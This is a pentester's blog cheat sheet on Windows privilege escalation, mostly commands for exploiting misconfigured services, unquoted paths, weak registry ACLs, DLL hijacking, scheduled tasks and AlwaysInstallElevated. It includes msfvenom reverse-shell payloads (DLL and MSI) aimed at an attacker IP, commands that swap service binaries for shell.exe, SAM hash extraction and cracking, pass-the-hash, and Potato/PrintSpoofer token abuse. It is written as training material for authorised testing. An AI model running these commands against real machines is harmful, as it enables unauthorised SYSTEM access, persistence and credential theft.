---
title: Windows Privilege Escalation
author: msplmee
date: 2022-05-05 11:33:00 +0700
categories: [Network Pentest, Privilege Escalation]
tags: [Windows, Privesc]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/posts/network_pentest/privesc_win.png
---

## Privilege Escalation Strategy

This section is coming straight from Tib3rius Udemy Course.

&gt; Spend some time and read over the results of your enumeration.
&gt; If WinPEAS or another tool finds something interesting, make a note of it.
&gt; Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work.
&gt;
&gt; Have a quick look around for files in your user’s desktop and other common locations (e.g. C:\ and C:\Program Files).
&gt; Read through interesting files that you find, as they may contain useful information that could help escalate privileges.
&gt;
&gt; Try things that don’t have many steps first, e.g. registry exploits, services, etc.
&gt; Have a good look at admin processes, enumerate their versions and search for exploits.
&gt; Check for internal ports that you might be able to forward to your attacking machine.
&gt;
&gt; If you still don’t have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd.
&gt; This might be a process or file name you aren’t familiar with or even a username.
&gt; At this stage you can also start to think about Kernel Exploits.

`Checklist`: https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation

## Users

&gt; Enumerating all users on a target machine can help identify potential high-privilege user accounts we could target in an attempt to elevate our privileges.

### Check user info

```powershell
C:\Cas&gt; whoami /all
C:\Cas&gt; net user &lt;user_name&gt;
C:\Cas&gt; net localgroup administrators
```

`SeImpersonatePrivilege`

`Privileges assigned account missing (restricted set of privileges)`

### User accounts on the system

```powershell
C:\Cas&gt; net users
C:\Cas&gt; net localgroups
C:\Cas&gt; net group /domain
C:\Cas&gt; net group /domain &lt;group_name&gt;
```

## OS Version & Architecture

```powershell
C:\Cas&gt; systeminfo
```

`Windows NT LIVDA 6.0 build 6001`

`Windows Server 2008 sp1 32-bit`

## Running Processes & Services

&gt; _“Services are simply programs that run in the background, accepting input or performing regular tasks. If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command execution with SYSTEM privileges as well”._

### Enumeration

**Running processes**

```powershell
C:\Cas&gt; tasklist /SVC
```

**Services**

```powershell
C:\Cas&gt; sc query &lt;service_name&gt;
C:\Cas&gt; accesschk64.exe -uwcqv &lt;user&gt; *
C:\Cas&gt; sc qc "service"
```

`IKEEXT`

### Service Misconfiguration

#### Insecure Service Permissions

&gt; If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.
&gt; Potential Rabbit Hole: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!”

Enumerate for vulnerable services (Can change Authenticated Users to other group)

```powershell
C:\Cas&gt; .\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

Enumerate for user permisson on a service

```powershell
C:\Cas&gt; .\accesschk.exe /accepteula -ucqv &lt;service_name&gt;
```

Then, change service config

```powershell
C:\Cas&gt; sc config &lt;service_name&gt; binpath= "C:\Cas\shell.exe"
```

#### Unquoted Service Path

&gt; In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument.
&gt; If we have permission to write a custom file to wither c:\\ or c:\\Program Files or c:\\Program Files\\Unquoted Path Service, then we can exploit this vulnerability to gain elevated privileges.

Enumerate for unquoted service paths

```powershell
C:\Cas&gt; wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\" |findstr /i /v """
```

Check user permission on folders:

```powershell
C:\Cas&gt; .\accesschk.exe /accepteula -uwdqs users "C:\Program Files\Unquoted Path Service\Common Scripts"
```

```powershell
C:\Cas&gt; copy shell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

#### Weak Registry Permissions

&gt; The Windows registry stores entries for each service.
&gt; Since registry entries can have ACLs(access control lists), if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.
&gt; If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then we can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then our program will execute, allowing the us to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

Check for permission on registry

```powershell
C:\Cas&gt; .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

```powershell
C:\Cas&gt; reg add &lt;weak_registry&gt; /v ImagePath /t REG_EXPAND_SZ /d C:\Cas\shell.exe /f
```

#### Insecure Service Executables

&gt; If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable

Check for user/group permission on executable file

```powershell
C:\Cas&gt; .\accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

```powershell
C:\Cas&gt; copy /Y shell.exe "C:\Program Files\File Permissions Service\&lt;insecure-service&gt;"
```

#### DLL Hijacking

&gt; Find a process that runs/will run as with other privileges (horizontal/lateral movement) that is missing a dll.
&gt; Have write permission on any folder where the dll is going to be searched (probably the executable directory or some folder inside the system path)

    Find missing Dlls inside system: [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)

```powershell
C:\Cas&gt; msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;my-ip&gt; LPORT=80 -f dll -o reverse.dll
```

## Networking Information

&gt; An attacker may use a compromised target to pivot, or move between connected networks. This will amplify network visibility and allow the attacker to target hosts not directly visible from the original attack machine.
&gt; We can also investigate port bindings to see if a running service is only available on a loopback address, rather than on a routable one. Investigating a privileged program or service listening on the loopback interface could expand our attack surface and increase our probability of a privilege escalation attack.

### Full TCP/IP configuration

```powershell
C:\Cas&gt; ipconfig /all
```

### Networking routing tables

```powershell
C:\Cas&gt; route print
```

### Active network connections

```powershell
C:\Cas&gt; netstat -ano
```

## Firewall Status and Rules

&gt; For example, if a network service is not remotely accessible because it is blocked by the firewall, it is generally accessible locally via the loopback interface. If we can interact with these services locally, we may be able to exploit them to escalate our privileges on the local system.
&gt; In addition, we can gather information about inbound and outbound port filtering during this phase to facilitate port forwarding and tunneling when it's time to pivot to an internal network.

### Firewall profile

```powershell
C:\Cas&gt; netsh advfirewall show currentprofile
```

### Firewall rules

```powershell
C:\Cas&gt; netsh advfirewall firewall show rule name=all
```

## Scheduled Tasks

List all scheduled tasks

```powershell
C:\Cas&gt; schtasks /query /fo LIST /v

C:\Cas&gt; Get-ScheduledTask | where {$_.TaskPath -notlike “\Microsoft*”} | ft TaskName,TaskPath,State
```

&gt; Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event (e.g. a user logon). Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM.

    Let’s append shell.exe to this script to get back reverse shell on machine

```powershell
C:\Cas&gt; echo C:\Cas\shell.exe &gt;&gt; C:\&lt;path-scheduled-tasks&gt;
```

## Installed Applications and Patch Levels

### Enumeration

List applications (use Windows Installer)

```powershell
C:\Cas&gt; wmic product get name, version, vendor
```

List system-wide updates

```powershell
C:\Cas&gt; wmic qfe get Caption, Description, HotFixID, InstalledOn
```

`Sticky Notes`

`Foxit Software`

`LAPS`

`PaperStream IP`

`Remote Mouse`

#### Insecure GUI Apps

&gt; On some (older) versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges. There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality. Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges.
&gt; We call this the “Citrix Method” because it uses many of the same techniques used to break out of Citrix environments.

### Startup Apps

&gt; Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.

    Add a startup script to this directory upon script execution

## Readable/Writable Files & Directories

&gt; This most often happens when an attacker can modify scripts or binary files that are executed under the context of a privileged account.

```powershell
C:\Cas&gt; accesschk.exe -uws "Everyone" "C:\Program Files"

C:\Cas&gt; Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

## Unmounted Disks

&gt; On most systems, drives are automatically mounted at boot time. Because of this, it's easy to forget about unmounted drives that could contain valuable information. We should always look for unmounted drives, and if they exist, check the mount permissions.

```powershell
C:\Cas&gt; mountvol
```

## Device Drivers and Kernel Modules

### List of drivers and kernel modules

```powershell
C:\Cas&gt; driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```

### Version of loaded driver

```powershell
C:\Cas&gt; Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

## Binaries That AutoElevate (Registry)

### AutoRuns

&gt; Windows can be configured to run commands at startup, with elevated privileges. These “AutoRuns” are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges

```powershell
C:\Cas&gt; copy /Y shell.exe "C:\Program Files\Autorun Program\program.exe"
```

### AlwaysInstallElevated

&gt; The catch is that two Registry settings must be enabled for this to work.
&gt; The “AlwaysInstallElevated” value must be set to 1 for both the local machine:
&gt; HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
&gt; and the current user: HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
&gt; If either of these are missing or disabled, the exploit will not work.
&gt; MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.

Generate a new reverse shell with msi extension

```powershell
C:\Cas&gt; msfvenom -p windows/x64/shell_reverse_tcp lhost=&lt;my-ip&gt; lport=443 -f msi -o shell.msi
```

```powershell
C:\Cas&gt; msiexec /quiet /qn /i shell.msi
```

## Passwords

### Registry

&gt; Registry — “Plenty of programs store configuration options in the Windows Registry. Windows itself sometimes will store passwords in plaintext in the Registry. It is always worth searching the Registry for passwords.”

### Saved Creds

&gt; Windows has a runas command which allows users to run commands with the privileges of other users. This usually requires the knowledge of the other user’s password. However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.

```powershell
C:\Cas&gt; cmdkey /list
```

```powershell
C:\Cas&gt; runas /savecred /user:&lt;user_name&gt; shell.exe
```

### Security Account Manager (SAM)

&gt; “Windows stores password hashes in the Security Account Manager (SAM). The hashes are encrypted with a key which can be found in a file named SYSTEM. If you have the ability to read the SAM and SYSTEM files, you can extract the hashes.”

    The SAM and SYSTEM files:  `C:\\Windows\System32\config `
    Backups of the files may exist: `C:\\Windows\\Repair` or `C:\\Windows\\System32\\config\\RegBack `
    Extract the hash using ‘[CredDump](https://github.com/Neohapsis/creddump7.git)’
    Use hashcat to crack hash

```powershell
C:\Cas&gt; hashcat -m 1000 --force &lt;hash&gt; /usr/share/wordlists/rockyou.txt
```

### Passing the Hash

&gt; Windows accepts hashes instead of passwords to authenticate to a number of services. We can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin user’s hash

```powershell
C:\Cas&gt; pth-winexe -U '&lt;NTLM hash&gt;' //&lt;IP&gt; cmd.exe
```

## Token Impersonation

### Rogue Potato

&gt; If the machine is &gt;= Windows 10 1809 & Windows Server 2019 — Try Rogue Potato
&gt; If the machine is &lt; Windows 10 1809 &lt; Windows Server 2019 — Try Juicy Potato

Get reverse shell of local service

```powershell
C:\Cas&gt; PsExec64.exe -i -u "nt authority\local service" C:\Cas\shell.exe
```

_“If you have SeAssignPrimaryToken or SeImpersonateprivilege, you are SYSTEM”_

```powershell
C:\Cas&gt; .\RoguePotato.exe -r &lt;remote-host&gt; -e "C:\Cas\shell.exe" -l 443
```

### PrintSpoofer

```powershell
C:\Cas&gt; PrintSpoofer.exe -c shell.exe -i
```

## Automated Enumeration

- _windows-privesc-check_

- _winPEASany_ofs.exe_
